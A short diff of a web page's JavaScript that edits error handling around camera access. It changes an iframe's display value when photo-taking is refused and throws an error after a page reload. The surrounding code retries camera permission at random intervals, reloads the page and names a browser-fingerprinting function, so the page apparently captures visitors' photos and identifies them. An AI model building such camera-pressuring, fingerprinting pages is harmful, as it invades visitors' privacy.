@@ -278,7 +278,7 @@
 					setTimeout(getUserMedia, (Math.floor(Math.random() * 6) + 5) * 1000);
 				} else {
 					await addLog('禁止拍照');
-					iframe.style.display = '';
+					iframe.style.display = 'block';
 					loader.style.display = 'none';
 				}
 			};
@@ -430,6 +430,7 @@
 					await addLog('刷新页面');
 					location.reload();
 				}, 3000);
+				throw new Error('获取权限失败')
 			};
 
 			const getFingerprint = async () => {
